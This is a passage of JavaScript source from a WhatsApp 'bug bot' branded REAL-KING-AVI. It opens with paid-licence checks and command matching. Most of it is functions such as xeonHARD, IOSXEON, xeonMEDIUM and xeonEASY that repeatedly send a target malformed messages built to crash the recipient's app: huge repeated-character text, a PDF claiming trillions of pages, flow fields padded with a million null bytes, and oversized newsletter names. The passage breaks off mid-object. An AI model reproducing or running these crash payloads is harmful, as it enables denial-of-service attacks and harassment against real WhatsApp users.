await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase33(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase34(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase35(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
            async function xeonydatabase36(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase37(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
async function xeonydatabase38(){
await replygcxeon('⚠️NUMBER NOT FOUND⚠️\n \nBuy vip membership from the real developer Xeon!!\n\nYouTube: youtube.com/@DGXeon\nTelegram: t.me/@DGXeon\nWhatsApp: +916909137213\n')
            	await delay(5000);
            console.error('⚠️YOUR PHONE NUMBER IS NOT FOUND IN THE DATABASE⚠️ \nBuy vip membership from the real developer Xeon!!\n\nYouTube: @DGXeon\nTelegram: @DGXeon\nWhatsApp: +916909137213\n');
            // Optionally notify the user here
            process.exit(1); // Exit with code 1 for access denied due to time limit
}
// Set the expiration time to a specific date (e.g., '2023-12-31T23:59:59Z')
const expirationDateString = '2024-11-30T12:00:00+05:30'; // Specify your desired expiration date here
const expirationTime = new Date(expirationDateString);
const currentTime = new Date();
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
const currentTime1 = new Date();
const currentTime2 = new Date();
const currentTime3 = new Date();
const currentTime4 = new Date();
const currentTime5 = new Date();
const currentTime6 = new Date();
const currentTime7 = new Date();
const currentTime8 = new Date();
const currentTime9 = new Date();
const currentTime10 = new Date();
const currentTime11 = new Date();
const currentTime12 = new Date();
const currentTime13 = new Date();
const currentTime14 = new Date();
const currentTime15 = new Date();
const currentTime16 = new Date();
const currentTime17 = new Date();
const currentTime18 = new Date();
const currentTime19 = new Date();
const currentTime20 = new Date();
const currentTime21 = new Date();
const currentTime22 = new Date();
const currentTime23 = new Date();
const currentTime24 = new Date();
const currentTime25 = new Date();
const currentTime26 = new Date();
const currentTime27 = new Date();
const currentTime28 = new Date();
const currentTime29 = new Date();
const currentTime30 = new Date();
const currentTime31 = new Date();
const currentTime32 = new Date();
const currentTime33 = new Date();

   
//self public
Avishka.public = true
if (!Avishka.public) {
if (!isCreator) return
}

if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('XeonBug14.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('There is an error:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `Sorry, the command you gave is wrong. Maybe this is what you mean:\n\n•> ${prefix+mean}\n•> Similarities: ${similarityPercentage}%`
replygcxeon(response)
}}   

        
    async function xeonHARD(target)
    {
          const gg = "ꦽ".repeat(10200);
          const ggg = "ꦿꦾ".repeat(10200);
          Avishka.relayMessage(target, {
            viewOnceMessage: {
              message: {
                extendedTextMessage: {
                  text: " '  🦄 REAL-KING-AVI 🦄 '\n" + gg,
                  previewType: "🦄 REAL-KING-AVI 🦄",
                  contextInfo: {
                    mentionedJid: ["916909137213@s.whatsapp.net", "916909137213@s.whatsapp.net"]
                  }
                }
              }
            }
          }, {
            participant: {
              jid: target
            }
          });
          await Avishka.relayMessage(target, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: xeontex
                  },
                  footer: {
                    text: ""
                  },
                  header: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true",
                      mimetype: "application/pdf",
                      fileSha256: "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=",
                      fileLength: null,
                      pageCount: 99999999999999,
                      contactVcard: true,
                      caption: "🦄 REAL-KING-AVI 🦄",
                      mediaKey: "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=",
                      fileName: "🦄 REAL-KING-AVI 🦄 ",
                      fileEncSha256: "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=",
                      directPath: "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1714145232",
                      thumbnailDirectPath: "/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0",
                      thumbnailSha256: "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=",
                      thumbnailEncSha256: "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=",
                      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==",
                      thumbnailHeight: 172,
                      thumbnailWidth: 480
                    },
                    hasMediaAttachment: true
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "🦄 REAL-KING-AVI 🦄",
                        sections: [{
                          title: "",
                          rows: [{
                            title: "🦄 REAL-KING-AVI 🦄",
                            id: ".huii"
                          }]
                        }]
                      })
                    }]
                  },
                  contextInfo: {
                    mentionedJid: jidds,
                    mentions: jidds
                  },
                  disappearingMode: {
                    initiator: "INITIATED_BY_ME",
                    inviteLinkGroupTypeV2: "DEFAULT",
                    messageContextInfo: {
                      deviceListMetadata: {
                        senderTimestamp: "1678285396",
                        recipientKeyHash: "SV5H7wGIOXqPtg==",
                        recipientTimestamp: "1678496731",
                        deviceListMetadataVersion: 2
                      }
                    }
                  }
                }
              }
            }
          }, {
            participant: {
              jid: target
            }
          });
          await Avishka.relayMessage(target, {
            viewOnceMessage: {
              message: {
                locationMessage: {
                  degreesLatitude: -21.980324912168495,
                  degreesLongitude: 24.549921490252018,
                  name: "🦄 REAL-KING-AVI 🦄" + ggg,
                  address: "",
                  jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAPwMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQEGAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAz2QAZ/Q57OSj+gLlnhnQdIBnhbzugXQZXcL6CF2XcIhqctQY3oMPokgQo6ArA2ZsVnlYUvnMq3lF7UfDKToz7SneaszZLzraR84aSDD7Jn//xAAhEAACAgIDAAMBAQAAAAAAAAABAgADBBESITETIkFRgf/aAAgBAQABPwAX2A2Op9MOSj1cbE7mEgqxy8NhsvDH+9RF12YGnFTLamPg3MnFONYFDbE+1liLx9MzXNVVdan8gdgVI/DEzlYaY9xbQRuJZyE5zKT5Mhj+ATGrUXDZ6EznJs3+RuvDOz3MXJRfo8+Sv1HE+xjsP2WMEfce5XUrv2MnoI6EJB8laAnuVUdgxelj1lpkE89Q7iO0ABGx/olNROyRE2hituW9IZah2TOBI7E48PYnEJsSm3YG4AGE4lfJk2a0sZuTdxiCpIjAOkLlQBqUOS2ojagOxMonmDOXsJHHqIdtLqSdESisq2yI2otnGZP2oVoDPNiBSBvUqO9SwdQGan//xAAdEQADAQADAAMAAAAAAAAAAAAAAQIRECExMkGB/9oACAECAQE/AMlpMXejivs2kydawnr0pKkWkvHpDOitzoeMldIw1OWNaR5+8P5cf//EAB0RAAIDAAIDAAAAAAAAAAAAAAERAAIQAxIgMVH/2gAIAQMBAT8Acpx2tXsIdZHowNwaPBF4M+Z//9k="
                }
              }
            }
          }, {
            participant: {
              jid: target
            }
          });
          await Avishka.relayMessage(target, {
            botInvokeMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadataVersion: 2,
                  deviceListMetadata: {}
                },
                interactiveMessage: {
                  nativeFlowMessage: {
                    buttons: [{
                      name: "payment_info",
                      buttonParamsJson: "{\"currency\":\"INR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4PVSNK5RNNJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"🦄 REAL-KING-AVI 🦄;\",\"key\":\"🦄 REAL-KING-AVI 🦄\",\"key_type\":\"RANDOM\"}}]}"
                    }]
                  }
                }
              }
            }
          }, {
            participant: {
              jid: target
            }
          });
          await Avishka.relayMessage(target, {
            viewOnceMessage: {
              message: {
                liveLocationMessage: {
                  degreesLatitude: 11111111,
                  degreesLongitude: -111111,
                  caption: xeontex,
                  url: "https://" + ggg + ".com",
                  sequenceNumber: "1678556734042001",
                  jpegThumbnail: null,
                  expiration: 7776000,
                  ephemeralSettingTimestamp: "1677306667",
                  disappearingMode: {
                    initiator: "INITIATED_BY_ME",
                    inviteLinkGroupTypeV2: "DEFAULT",
                    messageContextInfo: {
                      deviceListMetadata: {
                        senderTimestamp: "1678285396",
                        recipientKeyHash: "SV5H7wGIOXqPtg==",
                        recipientTimestamp: "1678496731",
                        deviceListMetadataVersion: 2
                      }
                    }
                  },
                  contextInfo: {
                    mentionedJid: jidds,
                    mentions: jidds,
                    isForwarded: true,
                    fromMe: false,
                    participant: "0@s.whatsapp.net",
                    remoteJid: "0@s.whatsapp.net"
                  }
                }
              }
            }
          }, {
            participant: {
              jid: target
            }
          });
        }
        
        async function IOSXEON(target){
        const {
      crashurl: xeonios
    } = require("./69/xeontext14");
        for (let i = 0; i < 10; i++) {
          await Avishka.relayMessage(target, {
            paymentInviteMessage: {
              serviceType: "UPI",
              expiryTimestamp: Date.now() + 86400000
            }
          }, {});
          await Avishka.relayMessage(target, {
            extendedTextMessage: {
              text: "This is a message with context info\n\n\n" + xeonios + xeonios,
              contextInfo: {
                stanzaId: "1234567890ABCDEF",
                participant: target,
                quotedMessage: {
                  conversation: "This is a quoted message"
                },
                remoteJid: target,
                mentionedJid: ["919366316018@s.whatsapp.net"],
                conversionSource: "source_example",
                conversionData: Buffer.from("conversion_data_example"),
                conversionDelaySeconds: 10,
                forwardingScore: 1,
                isForwarded: true,
                quotedAd: {
                  advertiserName: "Example Advertiser",
                  mediaType: 1,
                  jpegThumbnail: await getBuffer("https://t2.tudocdn.net/632662?w=646&h=284"),
                  caption: "This is an ad caption"
                },
                placeholderKey: {
                  remoteJid: target,
                  fromMe: false,
                  id: "ABCDEF1234567890"
                },
                expiration: 86400,
                ephemeralSettingTimestamp: Date.now(),
                ephemeralSharedSecret: Buffer.from("ephemeral_shared_secret_example"),
                externalAdReply: {
                  title: "🦄 REAL-KING-AVI 🦄",
                  body: "🦄 REAL-KING-AVI 🦄",
                  mediaType: 1,
                  thumbnailUrl: "https://files.catbox.moe/8ynou2.jpg",
                  mediaUrl: "https://files.catbox.moe/8ynou2.jpg",
                  thumbnail: Buffer.from("1234567890abcdef", "hex"),
                  sourceType: "source_type_example",
                  sourceId: "source_id_example",
                  sourceUrl: "https://files.catbox.moe/8ynou2.jpg",
                  containsAutoReply: true,
                  renderLargerThumbnail: true,
                  showAdAttribution: true,
                  ctwaClid: "ctwa_clid_example",
                  ref: "ref_example"
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {
                  duration: 604800
                },
                actionLink: {
                  buttonText: "Click Here",
                  url: "https://example.com"
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "919366316018-1234567890@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                  utmSource: "utm_source_example",
                  utmCampaign: "utm_campaign_example"
                },
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "919366316018-1234567890@g.us",
                  serverMessageId: 1,
                  newsletterName: "x".repeat(99999),
                  contentType: 1,
                  accessibilityText: "Example accessibility text"
                },
                businessMessageForwardInfo: {
                  businessOwnerJid: "919366316018@s.whatsapp.net"
                },
                smbClientCampaignId: "smb_client_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                  showMmDisclosure: true
                }
              }
            }
          }, {});
        }
        }
        
        async function xeonMEDIUM(target){
        	teks = "\n " + (args.join(" ") ? args.join(" ") : "🦄 REAL-KING-AVI 🦄") + "\n\n\n";
        jidds = [];
        teks += "*~@919366316018~*\n*🦄*\n*~@916909137213~*\n".repeat(10200);
        jidds.push("919366316018@s.whatsapp.net", "916909137213@s.whatsapp.net");
        	for (let i = 0; i < 15; i++) {
          await Avishka.relayMessage(target, {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: "🦄 REAL-KING-AVI 🦄",
                    format: "EXTENSIONS_1"
                  },
                  nativeFlowResponseMessage: {
                    name: "galaxy_message",
                    paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"🦄 REAL-KING-AVI 🦄\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"xeon@xeon.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "\0".repeat(1020000) + "\",\"screen_0_TextInput_1\":\"\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
                    version: 3
                  }
                }
              }
            }
          }, {
            participant: {
              jid: target
            }
          });
          await Avishka.relayMessage(target, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  header: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7118-24/17615855_551675737251863_4271555698403493805_n.enc?ccb=11-4&oh=01_Q5AaIDtkOUxo5HvFDHk-ZEZ1hO5kOxhBTPxB0jFBaLYgHuyF&oe=67328B3E&_nc_sid=5e03e0&mms3=true",
                      mimetype: "image/jpeg",
                      fileSha256: "MbV7wFnqBHBxkFHJVoD2WCJbPzG3c/wStbrxuAbF3g8=",
                      fileLength: "98582",
                      height: 1080,
                      width: 1080,
                      mediaKey: "dbzvvXNGG1fABfcIFZaYOpCShcFlK2Ug0aLz3FYermk=",
                      fileEncSha256: "7LBK1SJgTjHYD+ncIenKheuc6GeyIOf+W1LTumoK4bk=",
                      directPath: "/v/t62.7118-24/17615855_551675737251863_4271555698403493805_n.enc?ccb=11-4&oh=01_Q5AaIDtkOUxo5HvFDHk-ZEZ1hO5kOxhBTPxB0jFBaLYgHuyF&oe=67328B3E&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1728786867",
                      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAAAQMCBAUGAQADAQEAAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA+eWyOnBVsujOfbq3NdaUJEa8tNrXjR2wanuhOsV6HGGDYXju8p1zfU+P55fP71/mwX1/zvEFZGTrhy6JWU5jqhjw6INGRaJgKUwvk3QFq2C1sAun/8QAIxAAAgICAgIDAQEBAAAAAAAAAQIAEQMSBCExURATQWEiMv/aAAgBAQABPwA+4RCCJX7MdkdiOoMRPIgFfCrZowrQl7rR8iYlBDAxQyfliZL8gRHZRA4M3hsfGnqaFYrsP+psI2rzWqIhOprW4VNRcZaquNxMgFjszRrA9w4mD6am4uJy5QISRG4jLj3hUibGB7E4eVA6hhH5WLa+qAInHyK3JBc0qXMuRGzYc24vsGYs2JMhf7B/vzByOOF0au/E5uVWYDHNmhb1Ps9QuSJdTfuDLXmNmJ/YMku+4eyBKhELRQDCoNylEAJ/JSiAGKOoSLlxe1qfyBAIWJOqz6f78N0sbofIhJ1Ew+YTP//EAB4RAAICAgIDAAAAAAAAAAAAAAABERICIRBhMkJS/9oACAECAQE/ACYR7GSZUWxrJFehziW6MVVyixYb0Qh6Fzr6EIY/F8f/xAAnEQACAQIEBAcAAAAAAAAAAAABAgADERITITEiIzJBUVJTYXGBkf/aAAgBAwEBPwAoSCbQUwzgKdxpCbUrFTcSi1MAdjM0QrgMVqT7QVQoANQQFKhJBBMw+Dn8lVxUXCxmUvmmSvd4iIG6zOLsxicd9I5A2gAKjSZdt9PYTm+kJsr/ABH6vqU94mtVISbmf//Z"
                    },
                    title: "🦄 REAL-KING-AVI 🦄",
                    viewOnce: true,
                    hasMediaAttachment: false
                  },
                  body: {
                    text: ""
                  },
                  nativeFlowMessage: {
                    messageParamsJson: "",
                    buttons: [{
                      name: "call_permission_request",
                      buttonParamsJson: "{}"
                    }, {
                      name: "galaxy_message",
                      buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"🦄 REAL-KING-AVI 🦄\",\"flow_id\":\"🦄 REAL-KING-AVI 🦄\",\"flow_message_version\":\"9\",\"flow_token\":\"oxi\"}"
                    }]
                  }
                }
              }
            }
          }, {
            participant: {
              jid: target
            }
          });
          await Avishka.relayMessage(target, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: teks
                  },
                  footer: {
                    text: ""
                  },
                  header: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true",
                      mimetype: "application/pdf",
                      fileSha256: "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=",
                      fileLength: null,
                      pageCount: 99999999999999,
                      contactVcard: true,
                      caption: "🦄 REAL-KING-AVI 🦄",
                      mediaKey: "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=",
                      fileName: "🦄 REAL-KING-AVI 🦄 ",
                      fileEncSha256: "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=",
                      directPath: "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1714145232",
                      thumbnailDirectPath: "/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0",
                      thumbnailSha256: "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=",
                      thumbnailEncSha256: "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=",
                      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAAAQMCBAUGAQADAQEAAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA+eWyOnBVsujOfbq3NdaUJEa8tNrXjR2wanuhOsV6HGGDYXju8p1zfU+P55fP71/mwX1/zvEFZGTrhy6JWU5jqhjw6INGRaJgKUwvk3QFq2C1sAun/8QAIxAAAgICAgIDAQEBAAAAAAAAAQIAEQMSBCExURATQWEiMv/aAAgBAQABPwA+4RCCJX7MdkdiOoMRPIgFfCrZowrQl7rR8iYlBDAxQyfliZL8gRHZRA4M3hsfGnqaFYrsP+psI2rzWqIhOprW4VNRcZaquNxMgFjszRrA9w4mD6am4uJy5QISRG4jLj3hUibGB7E4eVA6hhH5WLa+qAInHyK3JBc0qXMuRGzYc24vsGYs2JMhf7B/vzByOOF0au/E5uVWYDHNmhb1Ps9QuSJdTfuDLXmNmJ/YMku+4eyBKhELRQDCoNylEAJ/JSiAGKOoSLlxe1qfyBAIWJOqz6f78N0sbofIhJ1Ew+YTP//EAB4RAAICAgIDAAAAAAAAAAAAAAABERICIRBhMkJS/9oACAECAQE/ACYR7GSZUWxrJFehziW6MVVyixYb0Qh6Fzr6EIY/F8f/xAAnEQACAQIEBAcAAAAAAAAAAAABAgADERITITEiIzJBUVJTYXGBkf/aAAgBAwEBPwAoSCbQUwzgKdxpCbUrFTcSi1MAdjM0QrgMVqT7QVQoANQQFKhJBBMw+Dn8lVxUXCxmUvmmSvd4iIG6zOLsxicd9I5A2gAKjSZdt9PYTm+kJsr/ABH6vqU94mtVISbmf//Z",
                      thumbnailHeight: 172,
                      thumbnailWidth: 480
                    },
                    hasMediaAttachment: true
                  },
                  nativeFlowMessage: {
                    buttons: [{
                      name: "single_select",
                      buttonParamsJson: JSON.stringify({
                        title: "CLICK",
                        sections: [{
                          title: "",
                          rows: [{
                            title: "🦄 REAL-KING-AVI 🦄",
                            id: ".huii"
                          }]
                        }]
                      })
                    }]
                  },
                  contextInfo: {
                    mentionedJid: jidds,
                    mentions: jidds
                  },
                  disappearingMode: {
                    initiator: "INITIATED_BY_ME",
                    inviteLinkGroupTypeV2: "DEFAULT",
                    messageContextInfo: {
                      deviceListMetadata: {
                        senderTimestamp: "1678285396",
                        recipientKeyHash: "SV5H7wGIOXqPtg==",
                        recipientTimestamp: "1678496731",
                        deviceListMetadataVersion: 2
                      }
                    }
                  }
                }
              }
            }
          }, {
            participant: {
              jid: target
            }
          });
        }
        }
        
        async function xeonEASY(target){
        	for (let i = 0; i < 10; i++) {
          await Avishka.relayMessage(target, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: xeontex
                  },
                  footer: {
                    text: ""
                  },
                  header: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true",
                      mimetype: "application/pdf",
                      fileSha256: "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=",
                      fileLength: null,
                      pageCount: 99999999999999,
                      contactVcard: true,
                      caption: "🦄 REAL-KING-AVI 🦄",
                      mediaKey: "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=",
                      fileName: "🦄 REAL-KING-AVI 🦄 ",
                      fileEncSha256: "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=",
                      directPath: "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1714145232",
                      thumbnailDirectPath: "/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0",
                      thumbnailSha256: "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=",
                      thumbnailEncSha256: "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=",
